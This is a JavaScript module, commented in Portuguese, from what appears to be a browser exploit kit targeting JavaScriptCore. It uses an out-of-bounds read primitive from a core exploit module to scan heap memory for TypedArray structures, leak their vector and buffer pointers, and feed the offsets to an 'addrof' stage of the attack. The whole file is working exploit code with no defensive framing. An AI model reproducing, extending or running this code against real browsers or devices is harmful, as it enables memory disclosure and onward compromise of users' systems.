// js/victim_finder.mjs
import { AdvancedInt64 } from './int64.mjs';
import { log, PAUSE_LAB, toHexS1 } from './utils.mjs';
import * as Core from './core_exploit.mjs';
import { JSC_OFFSETS, OOB_CONFIG, updateOOBConfigFromUI } from './config.mjs';

const FNAME_BASE = "VictimFinder";

// Mapeamento de exemplo para m_mode (JSC specific - precisa ser verificado para o alvo exato)
// Estes são valores comuns, mas podem variar.
const TYPED_ARRAY_MODES = {
    0x00: "Int8Array",
    0x01: "Int16Array",
    0x02: "Int32Array",
    0x03: "Uint8Array",
    0x04: "Uint8ClampedArray",
    0x05: "Uint16Array",
    0x06: "Uint32Array",
    0x07: "Float32Array",
    0x08: "Float64Array",
    0x09: "DataView",
    // BigInt64Array (geralmente 0x0A) e BigUint64Array (geralmente 0x0B) podem ser adicionados
};


/**
 * Escaneia a memória usando a primitiva OOB em busca de estruturas que se assemelham a TypedArrays.
 * @param {number} scanStartRelativeOffset - Offset relativo ao início da região OOB para começar a varredura.
 * @param {number} scanRangeBytes - Quantos bytes escanear a partir do scanStartRelativeOffset.
 * @param {number} stepBytes - Granularidade da varredura (ex: 4 ou 8 bytes).
 * @returns {Promise<Array<object>>} Uma lista de candidatos promissores.
 */
export async function scanMemoryForTypedArrayCandidates(scanStartRelativeOffset, scanRangeBytes, stepBytes = 8) {
    const FNAME_SCAN = `${FNAME_BASE}.scanMemory`;
    log(`--- Iniciando ${FNAME_SCAN} ---`, 'test', FNAME_SCAN);
    updateOOBConfigFromUI(); // Garante que as configs OOB estão atualizadas
    log(`   Configurações da varredura: Início Relativo=${toHexS1(scanStartRelativeOffset)}, Range=${scanRangeBytes} bytes, Passo=${stepBytes} bytes`, 'info', FNAME_SCAN);
    log(`   Usando Offsets TypedArray: M_VECTOR=${toHexS1(JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET)}, M_LENGTH=${toHexS1(JSC_OFFSETS.TypedArray.M_LENGTH_OFFSET)}, M_MODE=${toHexS1(JSC_OFFSETS.TypedArray.M_MODE_OFFSET)}, ASSOC_BUF=${toHexS1(JSC_OFFSETS.TypedArray.ASSOCIATED_ARRAYBUFFER_OFFSET)}`, 'info', FNAME_SCAN);


    if (!Core.oob_array_buffer_real || !Core.oob_dataview_real) {
        log("   Tentando ativar primitiva OOB primeiro...", 'warn', FNAME_SCAN);
        await Core.triggerOOB_primitive();
        if (!Core.oob_array_buffer_real) {
            log("   ERRO: Primitiva OOB não pôde ser ativada. Varredura abortada.", 'error', FNAME_SCAN);
            return [];
        }
    }

    const candidates = [];
    const maxRelativeOffsetToScanUpTo = scanStartRelativeOffset + scanRangeBytes;

    const lastFieldStructureOffset = Math.max(
        JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET,
        JSC_OFFSETS.TypedArray.M_LENGTH_OFFSET,
        JSC_OFFSETS.TypedArray.M_MODE_OFFSET,
        JSC_OFFSETS.TypedArray.ASSOCIATED_ARRAYBUFFER_OFFSET
    );
    const maxBytesToReadForAField = 8; // Ponteiros são 8 bytes

    // O safeReadLimitRelative é o offset base máximo do candidato tal que todos os seus campos ainda possam ser lidos.
    // O offset relativo para oob_read_relative é (absolute_offset_in_oob_array_buffer_real - OOB_CONFIG.BASE_OFFSET_IN_DV) + OOB_CONFIG.INITIAL_BUFFER_SIZE
    // O último byte absoluto que podemos ler é Core.oob_array_buffer_real.byteLength - 1
    // Então, o último relative_offset que podemos usar para ler 1 byte é:
    // (Core.oob_array_buffer_real.byteLength - 1 - OOB_CONFIG.BASE_OFFSET_IN_DV) + OOB_CONFIG.INITIAL_BUFFER_SIZE
    // Se queremos ler `maxBytesToReadForAField` bytes, o início dessa leitura deve ser mais cedo.
    const max_readable_relative_offset_for_any_field = (Core.oob_array_buffer_real.byteLength - OOB_CONFIG.BASE_OFFSET_IN_DV) + OOB_CONFIG.INITIAL_BUFFER_SIZE - maxBytesToReadForAField;
    const safeBaseCandidateLimitRelative = max_readable_relative_offset_for_any_field - lastFieldStructureOffset;


    log(`   Scan irá até offset relativo (base do candidato): ${toHexS1(maxRelativeOffsetToScanUpTo)}`, 'info', FNAME_SCAN);
    log(`   Limite seguro para base do candidato (relativo): ${toHexS1(safeBaseCandidateLimitRelative)}`, 'info', FNAME_SCAN);


    for (let currentCandidateBaseRelOffset = scanStartRelativeOffset; currentCandidateBaseRelOffset < maxRelativeOffsetToScanUpTo; currentCandidateBaseRelOffset += stepBytes) {
        if (currentCandidateBaseRelOffset > safeBaseCandidateLimitRelative) {
            log(`   AVISO: Base candidata ${toHexS1(currentCandidateBaseRelOffset)} excedeu limite seguro de leitura ${toHexS1(safeBaseCandidateLimitRelative)}. Parando varredura.`, 'warn', FNAME_SCAN);
            break;
        }

        if (document.hidden && FNAME_SCAN !== `${FNAME_BASE}.testModule`) {
             log("Varredura abortada, página não visível.", "warn", FNAME_SCAN); break;
        }
        await PAUSE_LAB(1);

        try {
            const modeReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.M_MODE_OFFSET;
            const m_mode_val = Core.oob_read_relative(modeReadOffset, 1);

            const lengthReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.M_LENGTH_OFFSET;
            const m_length_val = Core.oob_read_relative(lengthReadOffset, 4);

            const vectorReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET;
            const m_vector_ptr = Core.oob_read_relative(vectorReadOffset, 8);

            const typeName = TYPED_ARRAY_MODES[m_mode_val] || null;
            const isLengthPlausible = m_length_val > 0 && m_length_val < (1024 * 1024 * 32); // Max 32M elements
            const isVectorPlausible = m_vector_ptr && !m_vector_ptr.isNullPtr() && !m_vector_ptr.isNegativeOne() && m_vector_ptr.greaterThanOrEqual(new AdvancedInt64(0x1000, 0)); // Não muito baixo

            if (typeName && isLengthPlausible && isVectorPlausible) {
                const bufferPtrReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.ASSOCIATED_ARRAYBUFFER_OFFSET;
                const m_buffer_ptr = Core.oob_read_relative(bufferPtrReadOffset, 8);
                const isBufferPtrPlausible = m_buffer_ptr && !m_buffer_ptr.isNullPtr() && !m_buffer_ptr.isNegativeOne() && m_buffer_ptr.greaterThanOrEqual(new AdvancedInt64(0x1000, 0));

                if (isBufferPtrPlausible) {
                    const candidate = {
                        gapOrRelativeOffset: currentCandidateBaseRelOffset,
                        m_mode: m_mode_val,
                        typeName: typeName,
                        m_length: m_length_val,
                        m_vector_hex: m_vector_ptr.toString(true),
                        m_buffer_hex: m_buffer_ptr.toString(true),
                        raw_m_vector: m_vector_ptr,
                        raw_m_buffer: m_buffer_ptr
                    };
                    candidates.push(candidate);
                    log(`   CANDIDATO: GAP/OffsetRel: ${toHexS1(candidate.gapOrRelativeOffset)}, Tipo: ${typeName} (${toHexS1(m_mode_val,2)}), Len: ${m_length_val}, Vec: ${candidate.m_vector_hex}, Buf: ${candidate.m_buffer_hex}`, 'leak', FNAME_SCAN);
                }
            }
        } catch (e) {
            if (e instanceof RangeError && e.message.toLowerCase().includes("fora dos limites do buffer real")) {
                 log(`   Atingido limite do buffer real em base candidata ${toHexS1(currentCandidateBaseRelOffset)}. Parando varredura.`, 'warn', FNAME_SCAN);
                 break;
            }
        }
    }

    if (candidates.length > 0) {
        log(`   Varredura concluída. ${candidates.length} candidatos promissores encontrados.`, 'good', FNAME_SCAN);
    } else {
        log(`   Varredura concluída. Nenhum candidato promissor encontrado com os critérios atuais.`, 'warn', FNAME_SCAN);
    }
    log(`--- ${FNAME_SCAN} Concluído ---`, 'test', FNAME_SCAN);
    return candidates;
}

export async function findVictimButtonHandler() {
    const FNAME_HANDLER = `${FNAME_BASE}.Handler`;
    const scanRangeEl = document.getElementById('victimFinderScanRange');
    const scanStepEl = document.getElementById('victimFinderScanStep');
    const scanStartOffsetEl = document.getElementById('victimFinderScanStartOffset');

    const scanRange = scanRangeEl ? parseInt(scanRangeEl.value, 10) : 4096;
    const scanStep = scanStepEl ? parseInt(scanStepEl.value, 10) : 8;
    let scanStartOffset;

    try {
        const offsetStr = scanStartOffsetEl ? scanStartOffsetEl.value.trim() : "";
        if (offsetStr === "") { // Se vazio, usa o padrão
            scanStartOffset = Core.getInitialBufferSize();
            log(`   Offset inicial de varredura não especificado. Usando padrão: ${toHexS1(scanStartOffset)} (Core.getInitialBufferSize())`, "info", FNAME_HANDLER);
            if (scanStartOffsetEl) scanStartOffsetEl.value = toHexS1(scanStartOffset);
        } else if (offsetStr.toLowerCase().startsWith("0x")) {
            scanStartOffset = parseInt(offsetStr, 16);
        } else {
            scanStartOffset = parseInt(offsetStr, 10);
        }

        if (isNaN(scanStartOffset) || scanStartOffset < 0) {
             scanStartOffset = Core.getInitialBufferSize(); // Fallback para valor inválido
             log(`   Offset inicial de varredura '${offsetStr}' inválido. Usando padrão: ${toHexS1(scanStartOffset)}`, "warn", FNAME_HANDLER);
             if(scanStartOffsetEl) scanStartOffsetEl.value = toHexS1(scanStartOffset);
        } else {
            if(scanStartOffsetEl) scanStartOffsetEl.value = toHexS1(scanStartOffset); // Garante formato hex na UI
        }

    } catch (e) {
        scanStartOffset = Core.getInitialBufferSize(); // Fallback em caso de erro de parse
        log(`   Erro ao parsear offset inicial. Usando padrão: ${toHexS1(scanStartOffset)}. Erro: ${e.message}`, "warn", FNAME_HANDLER);
        if(scanStartOffsetEl) scanStartOffsetEl.value = toHexS1(scanStartOffset);
    }

    if (isNaN(scanRange) || scanRange <=0) {
        log("Range de varredura inválido.", "error", FNAME_HANDLER);
        if (scanRangeEl) scanRangeEl.value = 4096; // Reset para default
        return;
    }
    if (isNaN(scanStep) || scanStep <=0) {
        log("Passo de varredura inválido.", "error", FNAME_HANDLER);
        if (scanStepEl) scanStepEl.value = 8; // Reset para default
        return;
    }

    const candidates = await scanMemoryForTypedArrayCandidates(scanStartOffset, scanRange, scanStep);

    if (candidates.length > 0) {
        log("Candidatos Encontrados (GAP/Offset é relativo ao início da janela OOB do core_exploit):", "analysis", FNAME_HANDLER);
        candidates.forEach(c => {
            log(`  - GAP/Offset: ${toHexS1(c.gapOrRelativeOffset)} | Tipo: ${c.typeName} (${toHexS1(c.m_mode,2)}) | Len: ${c.m_length} | Vec: ${c.m_vector_hex} | Buf: ${c.m_buffer_hex}`, "analysis", FNAME_HANDLER);
        });

        const gapInputEl = document.getElementById('gap_to_test_input');
        const addrofGapEl = document.getElementById('addrofGap');
        if (candidates[0]) {
            const firstCandidateGap = candidates[0].gapOrRelativeOffset;
            if (gapInputEl) {
                gapInputEl.value = firstCandidateGap; // Em decimal para consistência com outros inputs de GAP
                log(`   GAP/Offset do primeiro candidato (${toHexS1(firstCandidateGap)}) populado no input 'gap_to_test_input' como ${firstCandidateGap}.`, "info", FNAME_HANDLER);
            }
            if (addrofGapEl) {
                addrofGapEl.value = firstCandidateGap; // Em decimal
                 log(`   GAP/Offset do primeiro candidato (${toHexS1(firstCandidateGap)}) populado no input 'addrofGap' como ${firstCandidateGap}.`, "info", FNAME_HANDLER);
            }
        }
    } else {
        log("Nenhum candidato a TypedArray encontrado na varredura.", "warn", FNAME_HANDLER);
    }
}
